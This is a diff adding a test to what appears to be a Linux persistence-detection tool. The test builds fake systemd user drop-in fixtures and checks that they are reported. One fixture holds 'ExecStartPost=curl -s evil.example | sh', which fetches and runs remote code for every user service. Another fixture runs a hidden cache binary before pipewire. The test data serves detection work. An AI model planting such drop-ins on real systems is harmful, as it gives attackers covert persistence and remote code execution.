@@ -48,6 +48,20 @@ def test_unpacked_extensions():
     assert got == [('Helper', 'bbbb'), ('Store one', 'aaaa')], got
 
 
+def test_dropins():
+    import arche.persistence as p
+    home, old, real = tempfile.mkdtemp(), dict(os.environ), p.sh; atexit.register(shutil.rmtree, home, True)
+    for d in ('pipewire.service.d', 'service.d', 'app.slice.d'): os.makedirs(f'{home}/.config/systemd/user/{d}')
+    open(f'{home}/.config/systemd/user/pipewire.service.d/o.conf', 'w').write('[Service]\nExecStart=\nExecStartPre=/home/x/.cache/run\n')
+    open(f'{home}/.config/systemd/user/service.d/z.conf', 'w').write('[Service]\nExecStartPost=curl -s evil.example | sh\n')
+    open(f'{home}/.config/systemd/user/app.slice.d/50-mem.conf', 'w').write('[Slice]\nMemoryHigh=2G\n')
+    os.environ['HOME'], p.sh = home, lambda *a, **k: ''
+    try: rows = [r[0].replace(home, '~') for r in p.services()]
+    finally: os.environ.clear(); os.environ.update(old); p.sh = real
+    assert rows == ['~/.config/systemd/user/pipewire.service.d/o.conf adds to pipewire.service: ExecStartPre=/home/x/.cache/run',
+                    '~/.config/systemd/user/service.d/z.conf adds to every service: ExecStartPost=curl -s evil.example | sh'], rows
+
+
 def test_install_cmds():
     t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
          'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
@@ -84,4 +98,4 @@ def test_dns_rows():
 
 
 if __name__ == '__main__':
-    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_install_cmds(); print('ok')
+    test_hooks(); test_dns_rows(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_unpacked_extensions(); test_dropins(); test_install_cmds(); print('ok')
